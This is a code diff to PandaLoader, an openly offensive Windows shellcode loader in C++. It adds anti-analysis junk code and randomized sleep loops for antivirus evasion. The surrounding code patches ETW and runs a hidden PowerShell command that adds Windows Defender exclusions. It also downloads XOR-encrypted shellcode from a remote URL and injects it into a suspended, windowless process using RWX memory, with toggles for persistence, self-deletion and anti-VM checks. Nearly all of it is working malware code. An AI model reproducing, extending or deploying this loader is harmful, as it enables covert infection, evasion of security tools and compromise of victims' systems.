@@ -1,29 +1,50 @@
-// https://github.com/Chainski/PandaLoader
 #include <windows.h>
 #include <wininet.h>
 #include <vector>
 #include <tlhelp32.h>
 #include <iostream>
 #include <string>
-#include <Shlwapi.h>
+#include <shlwapi.h>
 #include "obfusheader.h"
 #include <cstring> 
 #include <algorithm>
 #include <psapi.h>
-#pragma comment(lib, "Wininet.lib")
+#include <ctime>
+#include <cstdlib>
+#pragma comment(lib, "wininet.lib")
 #define ENABLE_ADMIN 0 // Mandatory when adding persistence and WD exclusions
 #define ADD_EXCLUSION 0 // Optional (Add Windows Defender Exclusions)
 #define MELT 0 // Deletes the payload after injection
 #define ENABLE_STARTUP 0 // Persist on the machine after reboot
-#define SLEEP_DELAY 0   // Might help in bypassing some AVs
-#define ENABLE_ANTIVM 0  // Set to 1 to enable anti-VM checks, 0 to disable
-#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") // Randomize these 
-#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") // Randomize these 
-#define FILENAME OBF("FILENAME_REPLACE_ME") // Randomize these 
+#define SLEEP_DELAY 0   // randomized sleep delays
+#define ENABLE_ANTIVM 0  // evade virtualized environments
+#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") 
+#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") 
+#define FILENAME OBF("FILENAME_REPLACE_ME")
 #define HIDE_DIRECTORY 0 // Optional
 #define XOR_DECRYPTION_KEY OBF("XOR_KEY_REPLACE_ME") // The decryption key for your shellcode
-#define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME") // Replace SHELLCODE_URL_REPLACE_ME with your shellcode link , NOTE x64 shellcode only.
+#define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME") // Replace SHELLCODE_URL_REPLACE_ME with your shellcode link 
 #define SINGLE_INSTANCE 1 // MUTEX 
+
+
+/* 
+ This file is part of PandaLoader. (https://github.com/Chainski/PandaLoader)
+ Copyright (C) 2025 Chainski
+
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.
+
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
+
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 
 typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("WriteProcessMemory"));
@@ -38,6 +59,30 @@ VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModu
 typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
 VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualAllocExNuma"));
 
+
+void junk_code() {
+    volatile unsigned long long j = 0xDEADBEEFDEADBEEFULL;
+    for (int a = 0; a < 97; ++a) {
+        for (int b = 0; b < 3; ++b) {
+            unsigned int r1 = (a + b) & 63u;
+            unsigned int r2 = (a * b + 11) & 63u;
+            unsigned int r3 = (b * 7 + a) & 31u;
+            unsigned int r4 = (a + 5) & 31u;
+            unsigned int r5 = (b + 3) & 15u;
+            j = (j << r1) | (j >> (64u - r1));
+            j ^= 0xABCDEF1234567890ULL;
+            j = ~j;
+            j = (j >> r2) | (j << (64u - r2));
+            j += 0x1111111111111111ULL;
+            j ^= (j >> r4);
+            j = __builtin_bswap64(j);
+            j ^= (0x13579BDF02468ACEULL + (unsigned long long)(a * 31337ULL) + (unsigned long long)b);
+            j = (j << r3) | (j >> (64u - r3));
+            j *= 0x9E3779B97F4A7C15ULL;
+            j ^= (j << r5);
+        }
+    }
+}
 
 BOOL ETWPATCH() {
     DWORD oldprotect = 0;
@@ -306,6 +351,7 @@ void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    std::string exePath = get_executable_path();
+   junk_code();
    std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
    ETWPATCH();
    if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
@@ -334,7 +380,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 #endif
     if (SLEEP_DELAY) {
-        Sleep(7000);
+        static bool __s = false;
+        if (!__s) {
+            std::srand(static_cast<unsigned int>(std::time(nullptr)));
+            __s = true;
+        }
+        const int __v[] = {10, 12, 14, 16};          
+        int __i = std::rand() % 4;
+        int __k = __v[__i];
+        std::time_t __t0 = std::time(nullptr);
+        volatile unsigned long long __r = 123456789ULL;
+        while ((std::time(nullptr) - __t0) < __k) {
+            for (unsigned int __j = 0u; __j < 500000u; ++__j) {
+                __r ^= static_cast<unsigned long long>(__j + 2718281u);
+            }
+        }
+        (void)__r; 
     }
     if (ADD_EXCLUSION) {
         ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
@@ -345,11 +406,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::vector<BYTE> payload;
     LPCWSTR url = SHELLCODE_URL;
     GetPayloadFromUrl(url, payload);
+	junk_code();
     std::string key = XOR_DECRYPTION_KEY;
     XORDecrypt(payload, key);
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
-    pwCreateProcess(OBF("C:\\Windows\\System32\\wbem\\wmiprvse.exe"), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    pwCreateProcess(OBF("INJECTION_TARGET"), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
